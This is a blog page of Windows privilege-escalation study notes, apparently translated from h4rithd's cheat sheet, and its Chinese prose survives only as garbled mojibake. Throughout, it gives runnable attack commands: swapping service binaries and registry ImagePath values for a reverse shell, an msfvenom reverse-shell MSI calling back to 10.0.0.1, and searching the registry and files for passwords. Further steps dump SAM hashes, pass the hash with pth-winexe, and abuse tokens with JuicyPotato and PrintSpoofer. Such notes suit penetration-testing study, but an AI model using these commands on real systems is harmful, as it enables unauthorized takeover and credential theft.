<h3 id="æœåŠ¡æ¼æ´"><a href="#æœåŠ¡æ¼æ´" class="headerlink" title="æœåŠ¡æ¼æ´"></a>æœåŠ¡æ¼æ´</h3><h4 id="æœåŠ¡å‘½ä»¤"><a href="#æœåŠ¡å‘½ä»¤" class="headerlink" title="æœåŠ¡å‘½ä»¤"></a>æœåŠ¡å‘½ä»¤</h4><p>æŸ¥è¯¢æœåŠ¡ï¼š<code>sc.exe qc &lt;name&gt;</code>Â æŸ¥è¯¢æœåŠ¡çš„çŠ¶æ€ï¼š<code>sc.exe query &lt;name&gt;</code>Â ä¿®æ”¹æœåŠ¡çš„é…ç½®é€‰é¡¹ï¼š<code>sc.exe config &lt;name&gt; &lt;option&gt;=&lt;value&gt;</code>Â å¯åŠ¨&#x2F;åœæ­¢æœåŠ¡ï¼š<code>net start/stop &lt;name&gt;</code></p>
<h4 id="å¯èƒ½çš„é…ç½®é”™è¯¯"><a href="#å¯èƒ½çš„é…ç½®é”™è¯¯" class="headerlink" title="å¯èƒ½çš„é…ç½®é”™è¯¯"></a>å¯èƒ½çš„é…ç½®é”™è¯¯</h4><ul>
<li>ä¸å®‰å…¨çš„æœåŠ¡å±æ€§</li>
<li>ä¸å¸¦å¼•å·çš„æœåŠ¡è·¯å¾„</li>
<li>æ³¨å†Œè¡¨æƒé™è¾ƒå¼±</li>
<li>ä¸å®‰å…¨çš„æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶</li>
<li>DLLåŠ«æŒ</li>
</ul>
<h4 id="ä¸å®‰å…¨çš„æœåŠ¡å±æ€§-æƒé™"><a href="#ä¸å®‰å…¨çš„æœåŠ¡å±æ€§-æƒé™" class="headerlink" title="ä¸å®‰å…¨çš„æœåŠ¡å±æ€§&#x2F;æƒé™"></a>ä¸å®‰å…¨çš„æœåŠ¡å±æ€§&#x2F;æƒé™</h4><p>å±é™©æƒé™ï¼š<code>SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS</code>Â æœ‰ç”¨æƒé™ï¼š<code>SERVICE_STOP, SERVICE_START</code></p>
<p><em>æ³¨æ„ï¼šå¦‚æœæ‚¨å¯ä»¥æ›´æ”¹æœåŠ¡é…ç½®ï¼Œä½†æ— æ³•åœæ­¢&#x2F;å¯åŠ¨æœåŠ¡ï¼Œåˆ™æ‚¨å¯èƒ½æ— æ³•ä½¿ç”¨ PrivEscï¼</em></p>
<h5 id="PrivEsc-ç¤ºä¾‹"><a href="#PrivEsc-ç¤ºä¾‹" class="headerlink" title="PrivEsc ç¤ºä¾‹"></a>PrivEsc ç¤ºä¾‹</h5><ol>
<li>ä½¿ç”¨ winPEAS æ£€æŸ¥ï¼š<code>.\winPEASany.exe quiet servicesinfo</code></li>
<li>ä½¿ç”¨ AccessChk ç¡®è®¤ç»“æœï¼š<code>.\accesschk.exe /accepteula -uwcqv user &lt;name&gt;</code></li>
<li>æ£€æŸ¥é…ç½®ï¼š<code>sc qc &lt;name&gt;</code></li>
<li>æ£€æŸ¥çŠ¶æ€ï¼š<code>sc query &lt;name&gt;</code></li>
<li>é‡æ–°é…ç½®è·¯å¾„ï¼š<code>sc config &lt;name&gt; binpath=&quot;\&quot;C:\PrivEsc\reverse.exe&quot;\&quot;</code></li>
<li>å¯åŠ¨ç›‘å¬å™¨</li>
<li>å¯åŠ¨&#x2F;é‡æ–°å¯åŠ¨æœåŠ¡ï¼š<code>net start &lt;name&gt;</code></li>
</ol>
<h4 id="ä¸å¸¦å¼•å·çš„æœåŠ¡è·¯å¾„"><a href="#ä¸å¸¦å¼•å·çš„æœåŠ¡è·¯å¾„" class="headerlink" title="ä¸å¸¦å¼•å·çš„æœåŠ¡è·¯å¾„"></a>ä¸å¸¦å¼•å·çš„æœåŠ¡è·¯å¾„</h4><p>ä¸å¸¦å¼•å·çš„è·¯å¾„ï¼ˆä¾‹å¦‚ï¼‰ï¼š<code>C:\Program Files\Some Dir\SomeProgram.exe</code>Â å¯èƒ½çš„è·¯å¾„ï¼š</p>
<ul>
<li><code>C:\Program.exe</code></li>
<li><code>C:\Program Files\Some.exe</code></li>
</ul>
<p>æ£€æŸ¥æ‰€æœ‰æ½œåœ¨çš„å†™å…¥æƒé™ï¼š</p>
<ul>
<li><code>.\accesschk.exe /accepteula -uwdq C:\</code></li>
<li><code>.\accesschk.exe /accepteula -uwdq &quot;C:\Program Files\&quot;</code></li>
<li><code>.\accesschk.exe /accepteula -uwdq &quot;C:\Program Files\Some Dir\&quot;</code></li>
</ul>
<p>å°† rev shell å¤åˆ¶åˆ°å¯å†™ç›®å½•ã€‚ç„¶å<code>net start &lt;name&gt;</code></p>
<h4 id="å¼±æ³¨å†Œè¡¨æƒé™"><a href="#å¼±æ³¨å†Œè¡¨æƒé™" class="headerlink" title="å¼±æ³¨å†Œè¡¨æƒé™"></a>å¼±æ³¨å†Œè¡¨æƒé™</h4><p>éœ€è¦ï¼šSERVICE_START</p>
<p>å¯ä»¥å…è®¸æ‚¨å°†æœåŠ¡é—´æ¥ä¿®æ”¹ä¸º PrivEsc</p>
<ol>
<li>æ£€æŸ¥æœåŠ¡é…ç½®æ˜¯å¦é”™è¯¯ï¼š<code>.\winPEASany.exe quiet servicesinfo</code></li>
<li>ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ä¹‹ä¸€ç¡®è®¤é…ç½®é”™è¯¯ï¼š<ol>
<li><code>PS&gt; Get-Acl HKLM:\System\CurrentControlSet\Services\&lt;name&gt; | Format-List</code></li>
<li><code>.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\&lt;name&gt;</code></li>
</ol>
</li>
<li>è¦†ç›–æ³¨å†Œè¡¨é”®å€¼ä»¥æŒ‡å‘æˆ‘ä»¬è‡ªå·±çš„ rev shellï¼š</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs batchfile">reg add HKLM\SYSTEM\CurrentControlSet\services\&lt;name&gt; /v ImagePath /t REG_EXPAND_SZ /d C:\path /f<br></code></pre></td></tr></table></figure>

<ol start="5">
<li>å¯åŠ¨æœåŠ¡ï¼š<code>net start &lt;name&gt;</code></li>
</ol>
<h4 id="ä¸å®‰å…¨çš„æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶"><a href="#ä¸å®‰å…¨çš„æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="ä¸å®‰å…¨çš„æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶"></a>ä¸å®‰å…¨çš„æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶</h4><p>éœ€è¦ï¼šSERVICE_START</p>
<p>å¦‚æœæˆ‘ä»¬æœ‰å†™å…¥æƒé™ï¼Œè¯·äº¤æ¢æœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p>
<ol>
<li>æ£€æŸ¥æ¼æ´ï¼š<code>.\winPEASany.exe quiet servicesinfo</code></li>
<li>ä½¿ç”¨ accesschk éªŒè¯ï¼š<code>.\accesschk.exe /accepteula -quvw &quot;C:\Program Files\Service Path\service.exe&quot;</code></li>
<li>å¤‡ä»½æœåŠ¡exeï¼š<code>copy &quot;C:\Program Files\Service Path\service.exe&quot; C:\Temp</code></li>
<li>ç”¨æˆ‘ä»¬çš„ revshell è¦†ç›–ï¼š<code>copy /Y C:\PrivEsc\reverse.exe &quot;C:\Program Files\Service Path\service.exe&quot;</code></li>
<li>åœ¨ Kali ä¸Šå¯åŠ¨ç›‘å¬å™¨</li>
<li>å¯åŠ¨æœåŠ¡ï¼š<code>net start &lt;name&gt;</code></li>
</ol>
<h4 id="DLLåŠ«æŒ"><a href="#DLLåŠ«æŒ" class="headerlink" title="DLLåŠ«æŒ"></a>DLLåŠ«æŒ</h4><p>éœ€è¦ï¼šSERVICE_START&#x2F;STOP</p>
<p>ï¼ˆå¯èƒ½éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œè¯·æŸ¥çœ‹ PDF ä»¥äº†è§£å¦‚ä½•æ‰§è¡Œçš„è¯¦ç»†ä¿¡æ¯ï¼‰</p>
<hr>
<h3 id="registry"><a href="#registry" class="headerlink" title="registry"></a>registry</h3><h4 id="è‡ªåŠ¨è¿è¡Œ"><a href="#è‡ªåŠ¨è¿è¡Œ" class="headerlink" title="è‡ªåŠ¨è¿è¡Œ"></a>è‡ªåŠ¨è¿è¡Œ</h4><p>æ³¨æ„ï¼šè¿™åªèƒ½ä»¥ Win 10 ä¸­æœ€åç™»å½•ç”¨æˆ·çš„æƒé™è¿è¡Œï¼æ‰€ä»¥ä½ é¦–å…ˆéœ€è¦ç®¡ç†å‘˜ä¿¡ç”¨ï¼ˆä½¿å…¶ä¸å¤ªå¯é ï¼‰</p>
<ol>
<li>æ£€æŸ¥å¯å†™çš„ AutoRun exe<ol>
<li><code>.\winPEASany.exe quiet applicationsinfo</code></li>
<li>æˆ–è€…æ‰‹åŠ¨ï¼š<ol>
<li><code>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></li>
<li>ä½¿ç”¨ accesschk éªŒè¯æ¯ä¸ªæ¡ç›®ï¼šÂ <code>.\accesschk.exe /accepteula -wvu &quot;C:\Program Files\&lt;path to program&gt;\program.exe&quot;</code></li>
</ol>
</li>
</ol>
</li>
<li>å¦‚æœå¯å†™ï¼Œåˆ™åˆ›å»ºå¤‡ä»½ï¼š<code>copy &quot;C:\Program Files\&lt;path to program&gt;\program.exe&quot; C:\temp</code></li>
<li>å¤åˆ¶revshell exeï¼š<code>copy /Y C:\temp\revshell.exe &quot;C:\Program Files\&lt;path to program&gt;\program.exe&quot;</code></li>
<li>å¯åŠ¨ revshell ä¾¦å¬å™¨å¹¶é‡æ–°å¯åŠ¨ç›’å­</li>
</ol>
<h4 id="å§‹ç»ˆå®‰è£…æå‡"><a href="#å§‹ç»ˆå®‰è£…æå‡" class="headerlink" title="å§‹ç»ˆå®‰è£…æå‡"></a>å§‹ç»ˆå®‰è£…æå‡</h4><p>éœ€è¦ï¼šAlwaysInstallElevated æ³¨å†Œè¡¨é¡¹</p>
<ol>
<li>éªŒè¯æ‰€éœ€æ¡ç›®å‡è®¾ç½®ä¸º 1<ol>
<li>ä½¿ç”¨ winPEASï¼š<code>.\winPEASany.exe quiet windowscreds</code></li>
<li>æ‰‹åŠ¨ï¼š<ol>
<li><code>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></li>
<li><code>reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></li>
</ol>
</li>
</ol>
</li>
<li>åˆ›å»ºä¸€ä¸ª msfvenom revshellï¼š<code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=443 -f msi -o revshell.msi</code></li>
<li>å°†msiæ–‡ä»¶å¤åˆ¶åˆ°ç›®æ ‡å¹¶å¯åŠ¨ç›‘å¬å™¨</li>
<li>å¯åŠ¨å®‰è£…ç¨‹åºï¼š<code>msiexec /quiet /qn /i C:\temp\revshell.msi</code></li>
</ol>
<hr>
<h3 id="å¯†ç "><a href="#å¯†ç " class="headerlink" title="å¯†ç "></a>å¯†ç </h3><h4 id="æ³¨å†Œè¡¨æœç´¢"><a href="#æ³¨å†Œè¡¨æœç´¢" class="headerlink" title="æ³¨å†Œè¡¨æœç´¢"></a>æ³¨å†Œè¡¨æœç´¢</h4><p>æ…¢é€Ÿæ–¹å¼ï¼ˆæ‰«ææ•´ä¸ªæ³¨å†Œè¡¨ï¼‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">&gt; reg query HKLM /f password /t REG_SZ /s<br>&gt; reg query HKCU /f password /t REG_SZ /s<br></code></pre></td></tr></table></figure>

<p>æ›´å¿«çš„æ–¹æ³•ï¼š</p>
<ol>
<li>ä½¿ç”¨ winpeas æ£€æŸ¥å¸¸è§ä½ç½®ï¼š<code>.\winPEASany.exe quiet filesinfo userinfo</code></li>
<li>ä½¿ç”¨æ³¨å†Œè¡¨æŸ¥è¯¢è¿›è¡ŒéªŒè¯</li>
<li>å¦‚æœéªŒè¯é€šè¿‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ winexe ç”Ÿæˆ shellï¼š<code>winexe -U &#39;user%password&#39; //the.targets.ip.here cmd.exe</code></li>
</ol>
<h3 id="ä¿å­˜çš„å‡­è¯"><a href="#ä¿å­˜çš„å‡­è¯" class="headerlink" title="ä¿å­˜çš„å‡­è¯"></a>ä¿å­˜çš„å‡­è¯</h3><ol>
<li>ä½¿ç”¨ winPEAS æ£€æŸ¥å·²ä¿å­˜çš„ä¿¡ç”¨ï¼š<code>.\winPEASany.exe quiet cmd windowscreds</code></li>
<li>éªŒè¯ï¼š<code>cmdkey /list</code></li>
<li>ç„¶åæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¿å­˜çš„å‡­æ®ä»¥ç”¨æˆ·èº«ä»½è¿è¡Œä»»ä½•å‘½ä»¤ï¼š<code>runas /savecred /user:admin C:\temp\revshell.exe</code></li>
</ol>
<h4 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h4><p>æ³¨æ„ï¼šUnattend.xml å¯èƒ½æ˜¯ä¸€ä¸ªæœ‰ç”¨çš„æ–‡ä»¶ï¼</p>
<p>æœç´¢é…ç½®æ–‡ä»¶ï¼ˆåŒ…å«å•è¯ pass æˆ–ä»¥ .config ç»“å°¾ï¼‰ï¼š<code>dir /s *pass* == *.config</code></p>
<p>æœç´¢åŒ…å«å¯†ç ä¸€è¯çš„æ–‡ä»¶ï¼š<code>findstr /si password *.xml *.ini *.txt</code></p>
<p>æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ winPEAS æŸ¥æ‰¾ç±»ä¼¼çš„æ–‡ä»¶ï¼š<code>.\winPEASany.exe quiet cmd searchfast filesinfo</code></p>
<p>ä»»ä½•åƒè¿™æ ·æ‰¾åˆ°çš„å‡­æ®éƒ½å¯èƒ½è¢« winexe æ»¥ç”¨ï¼š<code>winexe -U &#39;user%password&#39; //the.targets.ip.here cmd.exe</code></p>
<h4 id="SAM"><a href="#SAM" class="headerlink" title="SAM"></a>SAM</h4><p>SAM å’Œ SYSTEM æ–‡ä»¶è½¬å‚¨ã€‚æ£€æŸ¥<code>C:\Windows\Repair</code>æˆ–ä¸­æ˜¯å¦æœ‰ç¯®å­<code>C:\Windows\System32\config\RegBack</code></p>
<p>ä½¿ç”¨ creddumpã€pwdump æˆ– samdump è½¬å‚¨å¯†ç å“ˆå¸Œå€¼ã€‚ä½¿ç”¨ john æˆ– hashcat è¿›è¡Œç ´è§£ã€‚</p>
<h4 id="ä¼ é€’å“ˆå¸Œå€¼"><a href="#ä¼ é€’å“ˆå¸Œå€¼" class="headerlink" title="ä¼ é€’å“ˆå¸Œå€¼"></a>ä¼ é€’å“ˆå¸Œå€¼</h4><p>æ‚¨å¯ä»¥ä½¿ç”¨ pth-winexe ä¼ é€’å“ˆå¸Œå€¼ï¼Œè€Œä¸æ˜¯ç ´è§£è½¬å‚¨çš„å“ˆå¸Œå€¼ï¼š</p>
<p><code>pth-winexe -U &#39;admin%HASH_HERE&#39; //the.targets.ip.here cmd.exe</code></p>
<p>æ‚¨è¿˜å¯ä»¥æ·»åŠ <code>--system</code>ç®¡ç†å“ˆå¸Œæ¥ç”Ÿæˆ SYSTEM shellã€‚</p>
<hr>
<h3 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h3><p>è¦åˆ—å‡ºæ‰€æœ‰è®¡åˆ’ä»»åŠ¡ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°ï¼š<code>schtasks /query /fo LIST /v</code>Â Powershellï¼š<code>Get-ScheduledTask| where &#123;$_.TaskPath-notlike&quot;\Microsoft*&quot;&#125; | ft TaskName,TaskPath,State</code></p>
<ol>
<li>å¦‚æœæ‚¨å‘ç°å…·æœ‰é€‚å½“æƒé™çš„ä»»åŠ¡ï¼Œè¯·ä½¿ç”¨ accesschk è¿›è¡ŒéªŒè¯ï¼š<code>.\accesschk.exe /accepteula -quvw user C:\Program Files\&lt;path to program\program.exe</code></li>
<li>å¦‚æœæ‚¨å¯ä»¥å†™å…¥å®ƒï¼Œåˆ™å¯ä»¥å°†å…¶æ›¿æ¢ä¸º revshellï¼Œæˆ–è€…å¦‚æœå®ƒæ˜¯è„šæœ¬ï¼Œåˆ™å°†æˆ‘ä»¬çš„ revshell çš„è·¯å¾„é™„åŠ åˆ°å®ƒã€‚</li>
</ol>
<hr>
<h3 id="ä¸å®‰å…¨çš„-GUI-åº”ç”¨ç¨‹åº"><a href="#ä¸å®‰å…¨çš„-GUI-åº”ç”¨ç¨‹åº" class="headerlink" title="ä¸å®‰å…¨çš„ GUI åº”ç”¨ç¨‹åº"></a>ä¸å®‰å…¨çš„ GUI åº”ç”¨ç¨‹åº</h3><p>éœ€è¦ï¼šå¯ç”¨â€œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œâ€çš„ç¨‹åºã€‚</p>
<p>åœ¨ç¨‹åºä¸­ï¼šæ–‡ä»¶-&gt;æ‰“å¼€-&gt;<code>file://c:/windows/system32/cmd.exe</code></p>
<p>è¿™åº”è¯¥æ‰“å¼€ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œçš„ cmd.exeã€‚</p>
<hr>
<h3 id="ä»¤ç‰Œæ¨¡æ‹Ÿ"><a href="#ä»¤ç‰Œæ¨¡æ‹Ÿ" class="headerlink" title="ä»¤ç‰Œæ¨¡æ‹Ÿ"></a>ä»¤ç‰Œæ¨¡æ‹Ÿ</h3><p>æ‰€æœ‰è¿™äº›éƒ½éœ€è¦ï¼š<code>SeImpersonatePrivilege</code>æˆ–<code>SeAssignPrimaryToken</code></p>
<p>å¦‚æœæ‚¨éœ€è¦æœ¬åœ°æœåŠ¡å¸æˆ·ï¼ˆå¯èƒ½ï¼‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ PSExec64.exe ä»¥ç®¡ç†å‘˜èº«ä»½ç”Ÿæˆä¸€ä¸ªå¸æˆ·ï¼š<code>.\PSExec64.exe -i -u &quot;nt authority\local service&quot; C:\temp\revshell.exe</code></p>
<h3 id="å¤šæ±åœŸè±†"><a href="#å¤šæ±åœŸè±†" class="headerlink" title="å¤šæ±åœŸè±†"></a>å¤šæ±åœŸè±†</h3><p>è·‘æ­¥ï¼š <code>.\JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t * -c &#123;CLSID&#125;</code></p>
<p>åœ¨è¿™é‡ŒæŸ¥æ‰¾ CLSIDï¼š<a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p>
<h4 id="æµæ°“åœŸè±†"><a href="#æµæ°“åœŸè±†" class="headerlink" title="æµæ°“åœŸè±†"></a>æµæ°“åœŸè±†</h4><h4 id="æ‰“å°æ¬ºéª—è€…"><a href="#æ‰“å°æ¬ºéª—è€…" class="headerlink" title="æ‰“å°æ¬ºéª—è€…"></a>æ‰“å°æ¬ºéª—è€…</h4><p>è·‘æ­¥ï¼š<code>.\PrintSpoofer.exe -i -c &quot;C:\temp\revshell.exe&quot;</code></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="category-chain-item">å­¦ä¹ ç¬”è®°</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Offensive-security/" class="print-no-link">#Offensive security</a>
      
        <a href="/tags/Windows-privilege-escalation/" class="print-no-link">#Windows privilege escalation</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Windowsç‰¹æƒæå‡-h4rithd-2024.04.03ç‰ˆæœ¬</div>
      <div>https://sh1yan.top/2024/06/02/Windows-privilege-escalation-h4rithd-20240403/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2024å¹´6æœˆ2æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/06/02/Windows-Common-Command-Horizontal-Move-h4rithd-20240403/" title="Windowså¸¸ç”¨å‘½ä»¤-æ¨ªå‘ç§»åŠ¨-h4rithd-2024.04.03ç‰ˆæœ¬">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Windowså¸¸ç”¨å‘½ä»¤-æ¨ªå‘ç§»åŠ¨-h4rithd-2024.04.03ç‰ˆæœ¬</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/06/02/Windows-Command-Notes-Collection-hacktoday-net-20201201/" title="Windows å‘½ä»¤å¤‡å¿˜ç¬”è®°é›†åˆ-hacktoday.net-2020.12.01ç‰ˆæœ¬">
                        <span class="hidden-mobile">Windows å‘½ä»¤å¤‡å¿˜ç¬”è®°é›†åˆ-hacktoday.net-2020.12.01ç‰ˆæœ¬</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2025</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
